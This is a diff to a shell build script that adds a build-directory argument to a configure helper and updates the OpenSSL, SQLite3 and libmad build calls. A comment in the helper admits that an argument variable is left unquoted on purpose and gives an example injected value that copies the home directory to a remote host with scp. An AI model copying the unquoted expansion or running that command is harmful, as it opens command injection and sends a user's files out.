@@ -38,28 +38,32 @@ buildWithCMake() {
 # EXPECTED PARAMS :
 # 1 : Name of the dependency.
 # 2 : Directory containing the configure script.
-# 3 : Directory to install to.
-# 4 : File/Directory which, if it exists, makes us not trigger the build and install again.
-# 5 : Configure script name (usually 'configure' or 'config').
-# 6 : Extra arguments to the configure command. Whitespace-separated.
-# 7 : Install target.
+# 3 : Directory to place build files in. Created if it does not exist.
+# 4 : Directory to install to.
+# 5 : File/Directory which, if it exists, makes us not trigger the build and install again.
+# 6 : Configure script name (usually 'configure' or 'config').
+# 7 : Extra arguments to the configure command. Whitespace-separated.
+# 8 : Install target.
 buildWithConfigure() {
-    checkParamNum 7 $# || exit 1
+    checkParamNum 8 $# || exit 1
     local DEPENDENCY_NAME="${1}"
     local CONFIGURE_SOURCE_DIR="${2}"
-    local CONFIGURE_INSTALL_DIR="${3}"
-    local ALREADY_BUILT_FLAG="${4}"
-    local CONFIGURE="${5}"
-    local CONFIGURE_EXTRA_ARGS="${6}"
-    local INSTALL_TARGET="${7}"
+    local CONFIGURE_BINARY_DIR="${3}"
+    local CONFIGURE_INSTALL_DIR="${4}"
+    local ALREADY_BUILT_FLAG="${5}"
+    local CONFIGURE="${6}"
+    local CONFIGURE_EXTRA_ARGS="${7}"
+    local INSTALL_TARGET="${8}"
 
     message $'\nBuilding and installing '"${DEPENDENCY_NAME}"'...'
 
     cd "${CONFIGURE_SOURCE_DIR}"
-    if [ ! -e "${ALREADY_BUILT_FLAG}" ] || [ ! -e "Makefile"  ]; then
-        ./"${CONFIGURE}" --prefix="${CONFIGURE_INSTALL_DIR}" ${CONFIGURE_EXTRA_ARGS} # CONFIGURE_EXTRA_ARGS was not quoted on purpose ; we might have several arguments.
-                                                                                     # Yes, okay, this could potentially be a security risk, for example if CONFIGURE_EXTRA_ARGS
-                                                                                     # were equal to "; scp -r ~ hackerVpn:~/hackedStuff/inf3995", but oh well.
+    if [ ! -e "${ALREADY_BUILT_FLAG}" ] || [ ! -e "${CONFIGURE_BINARY_DIR}/Makefile"  ]; then
+        mkdir -p "${CONFIGURE_BINARY_DIR}"
+        cd "${CONFIGURE_BINARY_DIR}"
+        "${CONFIGURE_SOURCE_DIR}"/"${CONFIGURE}" --prefix="${CONFIGURE_INSTALL_DIR}" ${CONFIGURE_EXTRA_ARGS} # CONFIGURE_EXTRA_ARGS was not quoted on purpose ; we might have several arguments.
+                                                                                                               # Yes, okay, this could potentially be a security risk, for example if CONFIGURE_EXTRA_ARGS
+                                                                                                               # were equal to "; scp -r ~ hackerVpn:~/hackedStuff/inf3995", but oh well.
         make -j$(getCoreCount)
         make -j$(getCoreCount) "${INSTALL_TARGET}"
         message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
@@ -139,6 +143,7 @@ buildPistache() {
 
 buildOpenSsl() {
     local SOURCE_DIR="${DEPS_DIR}/openssl"
+    local BINARY_DIR="${SOURCE_DIR}/build"
     local INSTALL_DIR="${DEPS_INSTALL_DIR}"
     local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libssl.a"
     local CONFIGURE=config
@@ -146,7 +151,7 @@ buildOpenSsl() {
     local EXTRA_ARGS="--openssldir=${OPEN_SSL_CERTIFICATE_DIR}"
     local INSTALL_TARGET=install_sw
 
-    buildWithConfigure "openssl" "${SOURCE_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+    buildWithConfigure "openssl" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
 }
 
 buildTagLib() {
@@ -171,6 +176,7 @@ buildZLib() {
 
 buildSqlite3() {
     local SOURCE_DIR="${DEPS_DIR}/sqlite3"
+    local BINARY_DIR="${SOURCE_DIR}/build"
     local INSTALL_DIR="${DEPS_INSTALL_DIR}"
     local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libsqlite3.a"
     local CONFIGURE=configure
@@ -178,18 +184,19 @@ buildSqlite3() {
     local EXTRA_ARGS="--includedir=${SQLITE3_INCLUDE_DIR} --disable-tcl"
     local INSTALL_TARGET=install
 
-    buildWithConfigure "sqlite3" "${SOURCE_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+    buildWithConfigure "sqlite3" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
 }
 
 buildLibmad() {
     local SOURCE_DIR="${DEPS_DIR}/libmad"
+    local BINARY_DIR="${SOURCE_DIR}/build"
     local INSTALL_DIR="${DEPS_INSTALL_DIR}"
     local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libmad.a"
     local CONFIGURE=configure
     local EXTRA_ARGS=""
     local INSTALL_TARGET=install
 
-    buildWithConfigure "libmad" "${SOURCE_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+    buildWithConfigure "libmad" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
 }
 
 buildDependencies() {
